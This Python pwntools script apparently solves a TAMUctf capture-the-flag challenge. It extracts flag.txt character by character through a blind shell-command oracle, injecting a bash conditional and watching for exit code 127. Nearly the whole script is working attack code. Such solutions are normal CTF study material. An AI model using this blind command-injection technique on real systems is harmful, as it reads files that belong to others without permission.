#!/usr/bin/env python

from pwn import * 
from string import ascii_letters, digits, punctuation

r = remote("challenges.tamuctf.com", 3424)

context.log_level = 'DEBUG'

alphabet = ascii_letters + digits + '!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|~}'
flag = "gigem{r3v3r53\_5h3ll5"

# while flag[-1] != '}':
while True:
    for cand in alphabet:
        payload = 'if [[ $(cat flag.txt) == *"%s"* ]];then asdf; else echo;fi' % (flag+cand)
        r.sendlineafter("Execute: ", payload)
        res = r.recvline()

        if b'127' in res:
            flag += cand
            print('update! flag: %s' % flag)
            break
        else: continue

print("done!")
print(flag)
